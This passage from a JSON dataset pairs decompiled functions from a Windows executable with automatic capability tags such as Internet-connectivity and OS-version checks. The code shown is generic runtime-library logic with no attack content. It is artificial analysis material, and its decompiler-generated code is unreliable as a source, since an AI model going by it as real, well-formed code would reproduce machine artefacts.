1;\n        }\n    }\n    else {\n        iVar3 = 0x1f;\n        if (arg_ch != 0) {\n            for (; arg_ch >> iVar3 == 0; iVar3 = iVar3 + -1) {\n            }\n        }\n        if (arg_ch == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = iVar3 + 1;\n        }\n        iVar3 = iVar3 + 0x20;\n    }\n    cVar1 = *(arg_1ch + 4);\n    iVar3 = (((cVar1 == '\\0') - 1 & 0x1d) + 0x18) - iVar3;\n    var_8h = arg_10h - iVar3;\n    iVar4 = ((cVar1 == '\\0') - 1 & 0x380) + 0x7f;\n    if (iVar4 < var_8h) {\ncode_r0x004b7a34:\n        fcn.004050e2(arg_14h, arg_1ch);\n        return 3;\n    }\n    if (var_8h < ((cVar1 == '\\0') - 1 & 0xfffffc80) - 0x7e) {\n        iVar5 = arg_10h + -1 + iVar4;\n        var_8h = -iVar4;\n        if (iVar5 < 0) {\n            if (-iVar5 < 0x40) {\n                iVar8 = fcn.00404147();\n                fcn.00404147();\n                if ((arg_18h == '\\0') || ((iVar8 + -1 & arg_8h | iVar8 + -1 >> 0x20 & arg_ch) != 0)) {\n                    bVar2 = true;\n                }\n                else {\n                    bVar2 = false;\n                }\n                if (((arg_8h & iVar8 | arg_ch & iVar8 >> 0x20) != 0) || (bVar2)) {\n                    fcn.00404b88();\n                }\n                iVar8 = fcn.00401b8b();\n                uVar10 = iVar8 + 0xc;\n                if (uVar10 != 0) {\n                    uVar9 = fcn.00404e58();\n                    if (uVar9 < uVar10) {\n                        var_8h = ((arg_10h - iVar5) - iVar3) + -1;\n                    }\n                    goto code_r0x004b7a5e;\n                }\n            }\n            fcn.004062ee(arg_14h, arg_1ch);\n            return 2;\n        }\n    }\n    else {\n        if (iVar3 < 0) {\n            if (-iVar3 < 0x40) {\n                iVar8 = fcn.00404147();\n                fcn.00404147();\n                if ((arg_18h == '\\0') || ((iVar8 + -1 & arg_8h | iVar8 + -1 >> 0x20 & arg_ch) != 0)) {\n                    bVar2 = true;\n                }\n                else {\n                    bVar2 = false;\n                }\n                if (((arg_8h & iVar8 | arg_ch & iVar8 >> 0x20) != 0) || (bVar2)) {\n                    fcn.00404b88();\n                }\n                iVar8 = fcn.00401b8b();\n                uVar10 = iVar8 + 0xc;\n            }\n            else {\n                uVar10 = 0;\n            }\n            uVar9 = fcn.00406000();\n            if (uVar9 < uVar10) {\n                uVar10 = uVar10 >> 1;\n                var_8h = var_8h + 1;\n                if (((*(arg_1ch + 4) == '\\0') - 1 & 0x380) + 0x7f < var_8h) goto code_r0x004b7a34;\n            }\n            goto code_r0x004b7a5e;\n        }\n        if (iVar3 < 1) goto code_r0x004b7a5e;\n    }\n    uVar10 = fcn.00404147();\ncode_r0x004b7a5e:\n    uVar9 = fcn.00404e58();\n    arg_10h_00 = uVar10 & uVar9;\n    uVar7 = (uVar10 & uVar9) >> 0x20;\n    if (*(arg_1ch + 4) == '\\0') {\n        uVar6 = fcn.0040184d();\n        uVar7 = fcn.0040242d(arg_14h, var_8h, arg_10h_00, uVar7, uVar6);\n    }\n    else {\n        uVar6 = fcn.004048a9();\n        uVar7 = fcn.0040698d(arg_14h, var_8h, arg_10h_00, uVar7, uVar6);\n    }\n    return uVar7;\n}\n",
        "token_count": 1459
    },
    "00406929": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406929(int32_t param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x427240;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    if (*(param_1 + 0x10) < 1) {\n        if ((*(param_1 + 0x10) < 0) && (*(param_1 + 0xc) != 0)) {\n            fcn.00404679();\n        }\n    }\n    else {\n        var_10h = 0;\n        fcn.00404179(*(param_1 + 0xc));\n    }\n    var_10h = 0;\n    fcn.00404179(*(param_1 + 0x14));\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 256
    },
    "0040697e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040697e(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t **ppiVar3;\n    int32_t var_4h;\n    \n    if ((((*(arg_8h + 0x88) != 0) && (*(arg_8h + 0x88) != 0x571d10)) && (*(arg_8h + 0x7c) != NULL)) &&\n       (**(arg_8h + 0x7c) == 0)) {\n        piVar1 = *(arg_8h + 0x84);\n        if ((piVar1 != NULL) && (*piVar1 == 0)) {\n            fcn.0040640b(piVar1);\n            fcn.0040341d(*(arg_8h + 0x88));\n        }\n        piVar1 = *(arg_8h + 0x80);\n        if ((piVar1 != NULL) && (*piVar1 == 0)) {\n            fcn.0040640b(piVar1);\n            fcn.004020b8(*(arg_8h + 0x88));\n        }\n        fcn.0040640b(*(arg_8h + 0x7c));\n        fcn.0040640b(*(arg_8h + 0x88));\n    }\n    if ((*(arg_8h + 0x8c) != NULL) && (**(arg_8h + 0x8c) == 0)) {\n        fcn.0040640b(*(arg_8h + 0x90) + -0xfe);\n        fcn.0040640b(*(arg_8h + 0x94) + -0x80);\n        fcn.0040640b(*(arg_8h + 0x98) + -0x80);\n        fcn.0040640b(*(arg_8h + 0x8c));\n    }\n    fcn.00405399(*(arg_8h + 0x9c));\n    puVar2 = arg_8h + 0xa0;\n    var_4h = 6;\n    ppiVar3 = arg_8h + 0x28;\n    do {\n        if (((ppiVar3[-2] != 0x571f60) && (piVar1 = *ppiVar3,  piVar1 != NULL)) && (*piVar1 == 0)) {\n            fcn.0040640b(piVar1);\n            fcn.0040640b(*puVar2);\n        }\n        if (((ppiVar3[-3] != NULL) && (piVar1 = ppiVar3[-1],  piVar1 != NULL)) && (*piVar1 == 0)) {\n            fcn.0040640b(piVar1);\n        }\n        puVar2 = puVar2 + 1;\n        ppiVar3 = ppiVar3 + 4;\n        var_4h = var_4h + -1;\n    } while (var_4h != 0);\n    fcn.0040640b(arg_8h);\n    return;\n}\n",
        "token_count": 698
    },
    "004069ab": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004069ab(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405fec(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 297
    },
    "004069ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004069ec(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t arg_ch_00;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *puVar6;\n    uint var_3ch;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    fcn.00403120(0x30);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    puVar2 = fcn.0040273e(unaff_EBP + -0x3c);\n    puVar6 = extraout_ECX + 0x2c;\n    for (iVar5 = 0xb; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    arg_ch_00 = fcn.00401357();\n    iVar5 = *(unaff_EBP + -0x10);\n    *(unaff_EBP + -0x10) = iVar5;\n    *(iVar5 + 8) = 0;\n    *(iVar5 + 0x10) = 0;\n    *(iVar5 + 0x14) = 0;\n    *(iVar5 + 0x18) = 0;\n    uVar3 = *(arg_ch_00 + 0x1c);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.00401cc1(uVar3, 0, extraout_ECX + 0x2c);\n    *(iVar5 + 8) = uVar3;\n    fcn.00405885(0, arg_ch_00);\n    if (*(iVar5 + 0x28) == '\\0') {\n        cVar1 = *(arg_ch_00 + 0x29);\n    }\n    else {\n        cVar1 = *(arg_ch_00 + 0x28);\n    }\n    iVar4 = cVar1;\n    *(iVar5 + 0x1c) = iVar4;\n    if ((iVar4 < 0) || (0x7e < iVar4)) {\n        *(iVar5 + 0x1c) = 0;\n    }\n    fcn.00401834(iVar5 + 0x20, *(arg_ch_00 + 0x2b), *(arg_ch_00 + 0x2a), *(arg_ch_00 + 0x2e));\n    fcn.00401834(iVar5 + 0x24, *(arg_ch_00 + 0x2d), *(arg_ch_00 + 0x2c), *(arg_ch_00 + 0x2f));\n    if (*(unaff_EBP + 0xc) != '\\0') {\n        *(iVar5 + 0x20) = 0x76782b24;\n        *(iVar5 + 0x24) = 0x76782b24;\n    }\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 749
    },
    "00406a05": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a05(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    if ((*(in_ECX + 4) != '\\x03') && ('\\x01' < *(arg_8h + 4))) {\n        *(in_ECX + 4) = *(arg_8h + 4);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0041d4f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041d4f0(int32_t param_1)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(param_1 + 4) == 0) {\n        var_ch = 0x545f38;\n    }\n    else {\n        var_ch = *(param_1 + 4);\n    }\n    return var_ch;\n}\n",
        "token_count": 92
    },
    "0041e4c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e4c0(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00405457();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 96
    },
    "0041e540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e540(uint arg_8h, int32_t arg_ch)\n\n{\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 1) {\n        fcn.00401686(\"iostream stream error\", 0x15);\n    }\n    else {\n        arg_8h_00 = fcn.00404fe3(arg_ch);\n        fcn.00401e79(arg_8h_00);\n    }\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "00420a10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00420a10(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    LOCK();\n    piVar1 = param_1 + 4;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    var_4h = param_1;\n    if (iVar2 != 1) {\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 136
    },
    "004232a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004232a0(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00406136();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 94
    },
    "00424060": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424060(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404ccd();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 93
    },
    "00468ae8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00468ae8(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            float *arg_24h)\n\n{\n    uint32_t *puVar1;\n    float *pfVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_32ch;\n    uint *var_328h;\n    float fStack808;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pfVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.00403cec(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x00468ba6:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.0040191a(&var_31ch, &var_328h, arg_10h_00, &var_32ch);\n        fStack808 = fVar4;\n        *pfVar2 = fStack808;\n        if ((var_328h == &var_31ch) || (var_32ch != 0)) goto code_r0x00468ba6;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x00468bb2;\n        fVar4 = fcn.00401b59(fStack808, var_320h << 2);\n    }\n    *pfVar2 = fVar4;\ncode_r0x00468bb2:\n    cVar3 = fcn.00404011(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.004030bc(unaff_EBX);\n    return;\n}\n",
        "token_count": 567
    },
    "00403a3f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00403a3f(uint noname_0, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            int32_t *arg_20h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint arg_8h;\n    uint var_40h;\n    uint *var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_34h = arg_10h;\n    var_2ch = arg_20h;\n    if (arg_18h < 10) {\n        iVar4 = 1;\n    }\n    else if (arg_18h < 100) {\n        iVar4 = 2;\n    }\n    else {\n        iVar4 = (999 < arg_18h) + 3;\n    }\n    var_28h = &var_24h;\n    var_30h = iVar4;\n    cVar2 = fcn.0040650f(arg_10h);\n    for (iVar3 = 0; (cVar2 == '\\0' && (iVar3 < iVar4)); iVar3 = iVar3 + 1) {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.00405141();\n        }\n        pcVar1 = *(*var_2ch + 0x10);\n        (**0x578000)(0x48, *(arg_ch + 6));\n        cVar2 = (*pcVar1)();\n        iVar4 = var_30h;\n        if (cVar2 == '\\0') break;\n        fcn.004027f7();\n        cVar2 = fcn.0040650f(var_34h);\n        iVar4 = var_30h;\n    }\n    arg_8h = var_34h;\n    cVar2 = fcn.0040650f(var_34h);\n    if (cVar2 != '\\0') goto code_r0x00473014;\n    if (iVar4 <= iVar3) goto code_r0x00473014;\n    if (*(arg_ch + 4) == '\\0') {\n        fcn.00405141();\n    }\n    pcVar1 = *(*var_2ch + 0x38);\n    (**0x578000)(*(arg_ch + 6), 0);\n    cVar2 = (*pcVar1)();\n    if ((cVar2 != '+') && (cVar2 != '-')) goto code_r0x00473014;\n    var_28h = &var_24h + 1;\n    var_24h._0_1_ = cVar2;\n    while( true ) {\n        fcn.004027f7();\ncode_r0x00473014:\n        cVar2 = fcn.0040650f(var_34h);\n        if ((cVar2 != '\\0') || (var_30h <= iVar3)) break;\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.00405141();\n        }\n        pcVar1 = *(*var_2ch + 0x38);\n        (**0x578000)(*(arg_ch + 6), 0);\n        cVar2 = (*pcVar1)();\n        if (cVar2 != '0') break;\n        iVar3 = iVar3 + 1;\n    }\n    puVar5 = var_28h;\n    if (0 < iVar3) {\n        *var_28h = '0';\n        puVar5 = var_28h + 1;\n        var_28h = puVar5;\n    }\n    while (cVar2 = fcn.0040650f(var_34h),  cVar2 == '\\0') {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.00405141();\n        }\n        pcVar1 = *(*var_2ch + 0x38);\n        (**0x578000)(*(arg_ch + 6), 0);\n        cVar2 = (*pcVar1)();\n        puVar5 = var_28h;\n        if ((9 < cVar2 - 0x30U) || (var_30h <= iVar3)) break;\n        *var_28h = cVar2;\n        if (var_28h < &var_5h) {\n            var_28h = var_28h + 1;\n        }\n        puVar5 = var_28h;\n        iVar3 = iVar3 + 1;\n        fcn.004027f7();\n    }\n    if (iVar3 == 0) {\n        puVar5 = &var_24h;\n    }\n    *puVar5 = '\\0';\n    var_38h = 0;\n    iVar4 = fcn.00405682(&var_24h, &var_3ch, 10, &var_38h);\n    fcn.0040650f(var_34h);\n    if ((((var_3ch != &var_24h) && (var_38h == 0)) && (arg_14h <= iVar4)) && (iVar4 <= arg_18h)) {\n        *arg_1ch = iVar4;\n    }\n    fcn.004030bc(arg_8h);\n    return;\n}\n",
        "token_count": 1262
    },
    "00401ed8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00401ed8(uint noname_0, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            int32_t *arg_20h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint arg_8h;\n    uint var_40h;\n    uint *var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_34h = arg_10h;\n    var_2ch = arg_20h;\n    if (arg_18h < 10) {\n        iVar4 = 1;\n    }\n    else if (arg_18h < 100) {\n        iVar4 = 2;\n    }\n    else {\n        iVar4 = (999 < arg_18h) + 3;\n    }\n    var_28h = &var_24h;\n    var_30h = iVar4;\n    cVar2 = fcn.00401a8c(arg_10h);\n    for (iVar3 = 0; (cVar2 == '\\0' && (iVar3 < iVar4)); iVar3 = iVar3 + 1) {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        pcVar1 = *(*var_2ch + 0x10);\n        (**0x578000)(0x48, *(arg_ch + 6));\n        cVar2 = (*pcVar1)();\n        iVar4 = var_30h;\n        if (cVar2 == '\\0') break;\n        fcn.00404863();\n        cVar2 = fcn.00401a8c(var_34h);\n        iVar4 = var_30h;\n    }\n    arg_8h = var_34h;\n    cVar2 = fcn.00401a8c(var_34h);\n    if (cVar2 != '\\0') goto code_r0x004732c1;\n    if (iVar4 <= iVar3) goto code_r0x004732c1;\n    if (*(arg_ch + 4) == '\\0') {\n        fcn.00405d21();\n    }\n    pcVar1 = *(*var_2ch + 0x38);\n    (**0x578000)(*(arg_ch + 6), 0);\n    cVar2 = (*pcVar1)();\n    if ((cVar2 != '+') && (cVar2 != '-')) goto code_r0x004732c1;\n    var_28h = &var_24h + 1;\n    var_24h._0_1_ = cVar2;\n    while( true ) {\n        fcn.00404863();\ncode_r0x004732c1:\n        cVar2 = fcn.00401a8c(var_34h);\n        if ((cVar2 != '\\0') || (var_30h <= iVar3)) break;\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        pcVar1 = *(*var_2ch + 0x38);\n        (**0x578000)(*(arg_ch + 6), 0);\n        cVar2 = (*pcVar1)();\n        if (cVar2 != '0') break;\n        iVar3 = iVar3 + 1;\n    }\n    puVar5 = var_28h;\n    if (0 < iVar3) {\n        *var_28h = '0';\n        puVar5 = var_28h + 1;\n        var_28h = puVar5;\n    }\n    while (cVar2 = fcn.00401a8c(var_34h),  cVar2 == '\\0') {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        pcVar1 = *(*var_2ch + 0x38);\n        (**0x578000)(*(arg_ch + 6), 0);\n        cVar2 = (*pcVar1)();\n        puVar5 = var_28h;\n        if ((9 < cVar2 - 0x30U) || (var_30h <= iVar3)) break;\n        *var_28h = cVar2;\n        if (var_28h < &var_5h) {\n            var_28h = var_28h + 1;\n        }\n        puVar5 = var_28h;\n        iVar3 = iVar3 + 1;\n        fcn.00404863();\n    }\n    if (iVar3 == 0) {\n        puVar5 = &var_24h;\n    }\n    *puVar5 = '\\0';\n    var_38h = 0;\n    iVar4 = fcn.00405682(&var_24h, &var_3ch, 10, &var_38h);\n    fcn.00401a8c(var_34h);\n    if ((((var_3ch != &var_24h) && (var_38h == 0)) && (arg_14h <= iVar4)) && (iVar4 <= arg_18h)) {\n        *arg_1ch = iVar4;\n    }\n    fcn.004030bc(arg_8h);\n    return;\n}\n",
        "token_count": 1272
    },
    "00479290": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00479290(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            float *arg_24h)\n\n{\n    uint32_t *puVar1;\n    float *pfVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_32ch;\n    uint *var_328h;\n    float fStack808;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pfVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.00405867(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x0047934e:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.0040191a(&var_31ch, &var_328h, arg_10h_00, &var_32ch);\n        fStack808 = fVar4;\n        *pfVar2 = fStack808;\n        if ((var_328h == &var_31ch) || (var_32ch != 0)) goto code_r0x0047934e;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x0047935a;\n        fVar4 = fcn.00401b59(fStack808, var_320h << 2);\n    }\n    *pfVar2 = fVar4;\ncode_r0x0047935a:\n    cVar3 = fcn.0040650f(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.004030bc(unaff_EBX);\n    return;\n}\n",
        "token_count": 567
    },
    "00479e61": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00479e61(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            float *arg_24h)\n\n{\n    uint32_t *puVar1;\n    float *pfVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_32ch;\n    uint *var_328h;\n    float fStack808;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pfVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.004056aa(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x00479f1f:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.0040191a(&var_31ch, &var_328h, arg_10h_00, &var_32ch);\n        fStack808 = fVar4;\n        *pfVar2 = fStack808;\n        if ((var_328h == &var_31ch) || (var_32ch != 0)) goto code_r0x00479f1f;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x00479f2b;\n        fVar4 = fcn.00401b59(fStack808, var_320h << 2);\n    }\n    *pfVar2 = fVar4;\ncode_r0x00479f2b:\n    cVar3 = fcn.00401a8c(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.004030bc(unaff_EBX);\n    return;\n}\n",
        "token_count": 573
    },
    "00402b7b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
